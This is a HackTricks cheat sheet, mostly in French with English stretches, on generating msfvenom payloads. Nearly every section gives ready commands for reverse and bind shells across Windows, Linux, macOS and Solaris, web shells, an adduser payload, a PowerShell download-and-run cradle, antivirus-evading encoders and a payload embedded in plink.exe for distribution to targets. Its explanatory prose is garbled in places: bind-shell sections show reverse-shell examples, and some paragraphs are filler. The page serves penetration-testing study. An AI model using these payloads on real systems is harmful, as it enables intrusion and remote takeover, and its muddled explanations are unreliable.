# MSFVenom - Fiche de triche

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof sont lancées uniquement lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du pirate web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez à gagner grâce à vos piratages !

{% embed url="https://hackenproof.com/register" %}

---

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

On peut également utiliser `-a` pour spécifier l'architecture ou `--platform`
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Paramètres courants lors de la création d'un shellcode

When creating a shellcode using `msfvenom`, there are several common parameters that can be used to customize the output. These parameters allow you to tailor the shellcode to your specific needs. Below are some of the most commonly used parameters:

- **`-p`** or **`--payload`**: Specifies the payload to use. This can be a built-in payload or a custom one.
- **`-f`** or **`--format`**: Specifies the output format of the shellcode. This can be `exe`, `elf`, `raw`, `c`, `ruby`, `python`, and more.
- **`-e`** or **`--encoder`**: Specifies the encoder to use. Encoders are used to obfuscate the shellcode and bypass certain security measures.
- **`-b`** or **`--bad-chars`**: Specifies any characters that should be avoided in the shellcode. This is useful when dealing with certain restrictions or filters.
- **`-i`** or **`--iterations`**: Specifies the number of times the encoder should run. Increasing the number of iterations can increase the complexity of the shellcode.
- **`-a`** or **`--arch`**: Specifies the architecture of the target system. This can be `x86`, `x64`, `armle`, `aarch64`, and more.
- **`-o`** or **`--out`**: Specifies the output file where the shellcode will be saved.

These parameters can be combined and customized to create shellcode that suits your specific requirements.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
To create a reverse shell payload for Windows, we can use the `msfvenom` tool from the Metasploit Framework. The `msfvenom` tool allows us to generate various types of payloads, including reverse shells.

Here is an example command to generate a reverse shell payload for Windows:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<your IP address> LPORT=<listening port> -f exe > shell.exe
```

In this command, you need to replace `<your IP address>` with your actual IP address and `<listening port>` with the port number on which you want to listen for incoming connections.

The `-p` option specifies the payload to use, in this case, `windows/shell_reverse_tcp` which creates a reverse shell that connects back to the attacker's machine.

The `-f` option specifies the output format, in this case, `exe` which generates an executable file.

The `>` operator redirects the output to a file named `shell.exe`.

Once you have generated the payload, you can transfer it to the target Windows machine and execute it. When the payload is executed, it will establish a reverse shell connection back to your machine, allowing you to interact with the target system's command prompt.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command-line interface to interact with the target system. This can be useful for remote administration or for launching further attacks.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<local IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<local IP>`: The IP address of the machine where the bind shell will be running.
- `<port>`: The port number on which the bind shell will listen for incoming connections.
- `<format>`: The desired output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file where the bind shell payload will be saved.

For example, to create a bind shell payload for a Windows machine listening on port 4444, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o bind_shell.exe
```

This will generate an executable file named `bind_shell.exe` that can be executed on the target Windows machine to establish a bind shell.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
To create a user, you can use the `msfvenom` tool in Metasploit. The `msfvenom` tool allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

Here is an example of how to create a user using `msfvenom`:

```plaintext
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

This command will generate an executable file called `adduser.exe` that, when executed on a Windows system, will create a user with the specified username and password.

You can customize the payload by changing the `USER` and `PASS` parameters to the desired username and password.

Once you have generated the payload, you can deliver it to the target system using various methods, such as social engineering or exploiting vulnerabilities.

Remember to use these techniques responsibly and only on systems that you have proper authorization to test.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD

Le shell CMD est un shell de commande utilisé principalement sur les systèmes d'exploitation Windows. Il permet aux utilisateurs d'interagir avec le système d'exploitation en exécutant des commandes spécifiques. Le shell CMD est souvent utilisé dans le cadre de l'exploitation de vulnérabilités et du piratage éthique pour exécuter des commandes malveillantes sur une machine cible. Il offre une interface en ligne de commande qui permet aux hackers d'exécuter des scripts, de manipuler des fichiers et d'accéder à des fonctionnalités système. Le shell CMD est un outil puissant pour les hackers, car il leur permet d'exploiter les vulnérabilités et de prendre le contrôle d'un système cible.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Exécuter une commande**

The `msfvenom` tool can be used to generate payloads that can execute arbitrary commands on a target system. This can be useful during a penetration test to gain remote access and control over the target.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <output format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running.

The `-f` option specifies the output format, which can be one of the following:

- `elf`: Executable and Linkable Format (ELF)
- `exe`: Windows Executable
- `raw`: Raw payload
- `ruby`: Ruby script
- `c`: C code
- `python`: Python script
- `bash`: Bash script

The `-o` option specifies the output file where the payload will be saved.

Once the payload is generated, you can transfer it to the target system and execute it to gain command execution.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encodeur

L'encodage est une technique utilisée pour modifier le format d'un payload afin de contourner les mécanismes de détection des systèmes de sécurité. L'objectif est de rendre le payload indétectable par les outils de sécurité traditionnels.

L'encodage peut être utilisé pour éviter la détection des signatures de virus, des règles de pare-feu ou des systèmes de détection d'intrusion. Il peut également être utilisé pour contourner les filtres de contenu ou les mécanismes de détection de comportement anormal.

L'encodage peut être réalisé à l'aide d'outils tels que `msfvenom`, qui est un outil de génération de payloads inclus dans le framework Metasploit. `msfvenom` permet de générer des payloads encodés dans différents formats, tels que des fichiers exécutables, des scripts, des documents Office, etc.

L'encodage peut être effectué en utilisant différents algorithmes, tels que `xor`, `sub`, `add`, `rot`, etc. Ces algorithmes modifient les octets du payload d'origine pour générer un nouveau payload encodé.

L'utilisation d'un encodeur peut augmenter les chances de succès d'une attaque en rendant le payload indétectable par les systèmes de sécurité. Cependant, il est important de noter que l'encodage n'est pas une méthode infaillible et peut être contourné par des techniques de décodage avancées.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Intégré à l'intérieur d'un exécutable

Lorsque vous souhaitez incorporer un payload dans un exécutable existant, vous pouvez utiliser la fonctionnalité `msfvenom` de Metasploit Framework. `msfvenom` vous permet de générer un payload personnalisé et de l'injecter dans un fichier exécutable existant.

Pour incorporer un payload dans un exécutable, vous devez spécifier le type de payload que vous souhaitez utiliser, l'architecture cible, le format de sortie et le fichier exécutable cible. Par exemple, pour incorporer un payload de type reverse shell dans un exécutable Windows 32 bits, vous pouvez utiliser la commande suivante :

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<votre_IP> LPORT=<votre_port> -f exe -o <chemin_vers_le_fichier_executable>
```

Cette commande générera un payload de type reverse shell qui se connectera à votre adresse IP et au port spécifiés. Le payload sera ensuite injecté dans le fichier exécutable spécifié.

Une fois que vous avez généré l'exécutable avec le payload incorporé, vous pouvez le distribuer aux cibles potentielles. Lorsque le fichier exécutable est ouvert sur la machine cible, le payload sera exécuté en arrière-plan, établissant ainsi une connexion avec votre machine.

Il est important de noter que l'incorporation d'un payload dans un exécutable existant peut être considérée comme une activité malveillante et illégale sans le consentement approprié. Assurez-vous de toujours respecter les lois et réglementations en vigueur et d'obtenir les autorisations nécessaires avant d'effectuer de telles actions.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
A reverse shell is a type of payload that allows an attacker to establish a connection from the target machine to their own machine. This enables the attacker to gain remote access to the target machine and execute commands.

To create a reverse shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

Replace `<payload>` with the desired payload, `<attacker IP>` with the IP address of the attacker's machine, `<attacker port>` with the port number the attacker wants to listen on, `<format>` with the desired output format, and `<output file>` with the name of the output file.

For example, to create a reverse shell payload using the `bash` payload, with the attacker's IP address set to `192.168.0.100` and the port set to `4444`, you can use the following command:

```plaintext
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f elf -o reverse_shell.elf
```

This will create a reverse shell payload in ELF format and save it as `reverse_shell.elf`.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command prompt interface to interact with the target system. This allows an attacker to gain remote access and control over the compromised system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number on which the bind shell will listen for incoming connections.
- `<format>`: The desired output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file to save the generated payload.

For example, to create a bind shell payload for a Windows system, listening on port 4444, and save it as `shell.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o shell.exe
```

Once the payload is generated, you can transfer it to the target system and execute it to establish a bind shell connection.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

SunOS (Solaris) est un système d'exploitation basé sur UNIX développé par Sun Microsystems. Il est largement utilisé dans les environnements d'entreprise et offre une grande stabilité et une sécurité robuste. En tant que hacker, il est important de comprendre les spécificités de SunOS (Solaris) afin de pouvoir exploiter ses vulnérabilités et accéder aux systèmes cibles. Dans cette section, nous examinerons les méthodes et les ressources spécifiques à SunOS (Solaris) pour vous aider à mener à bien vos activités de piratage.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
A reverse shell is a type of payload that allows an attacker to establish a connection from the target machine to their own machine. This enables the attacker to remotely control the target machine and execute commands on it.

To create a reverse shell payload for macOS, we can use the `msfvenom` tool from the Metasploit Framework. The `msfvenom` tool allows us to generate various types of payloads, including reverse shells.

Here is an example command to generate a reverse shell payload for macOS:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f macho > reverse_shell.macho
```

In this command, replace `<attacker IP>` with the IP address of the attacker machine and `<attacker port>` with the port number on which the attacker machine is listening for the reverse shell connection.

The generated payload will be saved in the `reverse_shell.macho` file.

Once the payload is generated, the attacker can deliver it to the target machine using various methods, such as social engineering or exploiting vulnerabilities. When the payload is executed on the target machine, it will establish a reverse shell connection back to the attacker machine.

The attacker can then use this reverse shell connection to execute commands on the target machine and perform various malicious activities.
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
A bind shell is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the bind shell provides a command-line interface to interact with the compromised system. This allows an attacker to remotely execute commands and control the system.

To create a bind shell payload using `msfvenom`, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number to listen on.
- `<format>`: The output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The name of the output file to save the payload.

For example, to create a bind shell payload for Windows using the `windows/meterpreter/reverse_tcp` payload, with the attacker IP set to `192.168.0.100` and the port set to `4444`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o bind_shell.exe
```

This will generate an executable file named `bind_shell.exe` that, when executed on the target system, will establish a reverse TCP connection to the attacker's machine.

Remember to use bind shells responsibly and only in authorized penetration testing engagements.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Charges utiles basées sur le Web**

### **PHP**

#### Shell inversé
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
The ASP/x reverse shell technique allows an attacker to gain remote access to a target system running ASP or ASP.NET. This technique involves creating a malicious ASP or ASP.NET file that, when executed on the target system, establishes a reverse connection back to the attacker's machine.

To create a reverse shell payload using the `msfvenom` tool, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f asp > shell.asp
```

Replace `<attacker IP>` with the IP address of your machine and `<attacker port>` with the port number you want to use for the reverse connection.

This command generates a payload in ASP format (`-f asp`) that uses the `windows/meterpreter/reverse_tcp` payload. The payload establishes a reverse TCP connection to the specified IP address and port.

Once you have generated the `shell.asp` file, you can upload it to the target system and execute it. This will establish a reverse shell connection, allowing you to interact with the target system's command prompt and execute commands remotely.

Note that the success of this technique depends on various factors, such as the target system's security measures and the ability to upload and execute files on the target system.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
Le shell inversé est une technique couramment utilisée en piratage pour établir une connexion entre un attaquant et une machine cible. Cela permet à l'attaquant de contrôler à distance la machine cible et d'exécuter des commandes. Dans cet exemple, nous allons utiliser le langage JSP (JavaServer Pages) pour créer un shell inversé.

##### Étape 1: Générer le payload

Nous allons utiliser l'outil `msfvenom` pour générer notre payload JSP. Assurez-vous d'avoir installé Metasploit Framework sur votre machine.

```plaintext
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<votre adresse IP> LPORT=<votre port> -f raw > shell.jsp
```

Remplacez `<votre adresse IP>` par votre adresse IP et `<votre port>` par le port que vous souhaitez utiliser pour la connexion.

##### Étape 2: Héberger le shell

Maintenant que nous avons généré notre shell JSP, nous devons le héberger sur un serveur Web. Vous pouvez utiliser n'importe quel serveur Web de votre choix. Par exemple, si vous utilisez Apache, vous pouvez copier le fichier `shell.jsp` dans le répertoire `/var/www/html` de votre serveur.

##### Étape 3: Établir la connexion

Une fois que le shell JSP est hébergé, vous pouvez utiliser un navigateur Web pour accéder à l'URL suivante:

```plaintext
http://<adresse IP du serveur>/<chemin vers le shell.jsp>
```

Remplacez `<adresse IP du serveur>` par l'adresse IP de votre serveur et `<chemin vers le shell.jsp>` par le chemin vers le fichier `shell.jsp` sur votre serveur.

##### Étape 4: Contrôler la machine cible

Lorsque vous accédez à l'URL, le shell JSP se connectera à votre machine en tant que client et vous pourrez exécuter des commandes à distance sur la machine cible.

##### Conseils de sécurité

L'utilisation de shells inversés est une technique puissante, mais elle peut également être dangereuse si elle est utilisée de manière malveillante. Assurez-vous de toujours obtenir une autorisation appropriée avant de tester cette technique et de prendre des mesures pour sécuriser vos systèmes contre les attaques.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
La technique de Reverse Shell permet à un attaquant d'établir une connexion depuis une machine compromise vers une machine distante, en utilisant un shell inversé. Cela permet à l'attaquant de contrôler à distance la machine compromise et d'exécuter des commandes à partir de celle-ci.

L'outil `msfvenom` de Metasploit Framework est un outil puissant pour générer des charges utiles (payloads) malveillantes. Il peut être utilisé pour générer un payload de Reverse Shell qui sera exécuté sur la machine cible.

Pour générer un payload de Reverse Shell avec `msfvenom`, vous pouvez utiliser la commande suivante :

```plaintext
msfvenom -p <payload> LHOST=<adresse IP> LPORT=<port> -f <format> -o <fichier de sortie>
```

- `<payload>` : Le type de payload à utiliser, par exemple `windows/meterpreter/reverse_tcp` pour les systèmes Windows.
- `<adresse IP>` : L'adresse IP de la machine à laquelle le Reverse Shell se connectera.
- `<port>` : Le port sur lequel le Reverse Shell se connectera.
- `<format>` : Le format de sortie du payload, par exemple `exe` pour un fichier exécutable Windows.
- `<fichier de sortie>` : Le nom du fichier de sortie qui contiendra le payload généré.

Une fois que vous avez généré le payload de Reverse Shell, vous pouvez l'envoyer à la machine cible et l'exécuter pour établir une connexion inversée. Cela permettra à l'attaquant de contrôler à distance la machine compromise et d'exécuter des commandes à partir de celle-ci.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS est une plateforme logicielle open-source basée sur le moteur JavaScript V8 de Google. Elle permet d'exécuter du code JavaScript côté serveur, ce qui en fait un choix populaire pour le développement d'applications web. NodeJS est connu pour sa capacité à gérer de manière efficace les opérations d'entrée/sortie asynchrones, ce qui le rend adapté aux applications en temps réel et aux serveurs web à haute performance.

#### Injection de code NodeJS

L'injection de code NodeJS est une technique couramment utilisée pour exploiter les vulnérabilités des applications web basées sur NodeJS. Elle consiste à insérer du code malveillant dans une application afin de contourner les mécanismes de sécurité et d'exécuter des commandes non autorisées sur le serveur.

#### Utilisation de MSFVenom avec NodeJS

MSFVenom est un outil puissant inclus dans le framework Metasploit qui permet de générer des charges utiles (payloads) pour l'exploitation de vulnérabilités. Il peut être utilisé pour générer des charges utiles spécifiques à NodeJS, qui peuvent être injectées dans une application web pour obtenir un accès non autorisé au serveur.

Pour générer une charge utile NodeJS avec MSFVenom, utilisez la commande suivante :

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=<votre adresse IP> LPORT=<votre port> -f <format> -o <nom du fichier de sortie>
```

Remplacez `<votre adresse IP>` par votre adresse IP et `<votre port>` par le port sur lequel vous souhaitez recevoir la connexion inversée. `<format>` peut être `raw`, `base64`, `python`, `ruby`, `c`, `exe`, `elf`, `dll`, `java`, `war`, `asp`, `jsp`, `war`, `pl`, `ps1`, `hta`, `psh`, `msi`, `msi-nouac`, `psh-net`, `psh-reflection`, `psh-cmd`, `psh-net2exe`, `psh-reflection2exe`, `psh-cmd2exe`, `psh-net_encoded`, `psh-reflection_encoded`, `psh-cmd_encoded`, `psh-net2exe_encoded`, `psh-reflection2exe_encoded` ou `psh-cmd2exe_encoded`. `<nom du fichier de sortie>` est le nom du fichier dans lequel la charge utile sera enregistrée.

Une fois que vous avez généré la charge utile, vous pouvez l'injecter dans une application web vulnérable pour obtenir un accès non autorisé au serveur NodeJS.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Charges utiles de langage de script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python is a versatile and powerful programming language that is widely used in the field of hacking. Its simplicity and readability make it a popular choice among hackers for developing various hacking tools and scripts. Python provides a wide range of libraries and modules that can be used for different hacking tasks, such as network scanning, vulnerability assessment, and exploit development.

Python's extensive standard library and third-party packages, such as `requests` and `BeautifulSoup`, make it easy to interact with web applications and perform tasks like web scraping and form submission. Additionally, Python's support for socket programming allows hackers to create network tools for tasks like port scanning and banner grabbing.

One of the key advantages of Python is its cross-platform compatibility, which means that Python scripts can be run on different operating systems without any modifications. This makes it convenient for hackers who need to work on multiple platforms during their hacking activities.

Python also has a large and active community of developers, which means that there are plenty of resources and support available for hackers who are using Python for their hacking projects. Online forums, documentation, and tutorials can help hackers learn and improve their Python skills.

Overall, Python is a valuable tool for hackers due to its versatility, simplicity, and extensive library support. Whether you are a beginner or an experienced hacker, Python can be a valuable asset in your hacking toolkit.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash, également connu sous le nom de Bourne Again SHell, est un interpréteur de commandes populaire utilisé dans les systèmes d'exploitation basés sur Unix. Il offre une interface en ligne de commande pour exécuter des commandes, des scripts et des programmes. Bash est largement utilisé dans le domaine de la programmation et de l'administration système en raison de sa flexibilité et de sa puissance.

Voici quelques fonctionnalités clés de Bash :

- **Auto-complétion** : Bash propose une fonctionnalité d'auto-complétion qui permet de compléter automatiquement les commandes, les noms de fichiers et les chemins d'accès en appuyant sur la touche Tab. Cela facilite la saisie des commandes et réduit les erreurs de frappe.

- **Historique des commandes** : Bash conserve un historique des commandes précédemment exécutées, ce qui permet de les rappeler et de les réutiliser facilement. Il suffit de naviguer dans l'historique à l'aide des touches fléchées et d'appuyer sur Entrée pour exécuter une commande précédente.

- **Redirection des entrées/sorties** : Bash permet de rediriger les entrées et les sorties des commandes vers des fichiers ou d'autres commandes. Par exemple, vous pouvez rediriger la sortie d'une commande vers un fichier ou utiliser le contenu d'un fichier comme entrée pour une commande.

- **Variables et scripts** : Bash prend en charge les variables, ce qui permet de stocker des valeurs et de les utiliser dans les commandes et les scripts. Il permet également d'écrire des scripts shell pour automatiser des tâches répétitives.

- **Gestion des processus** : Bash permet de gérer les processus en cours d'exécution, tels que l'arrêt, la suspension et la reprise. Il offre également des fonctionnalités avancées telles que les tâches en arrière-plan et les processus en premier plan.

Bash est un outil puissant et polyvalent qui peut être utilisé pour diverses tâches, allant de l'automatisation des tâches système à la programmation avancée. Il est largement utilisé par les administrateurs système, les développeurs et les hackers pour sa flexibilité et sa facilité d'utilisation.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof ne sont lancées que lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du hacking web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
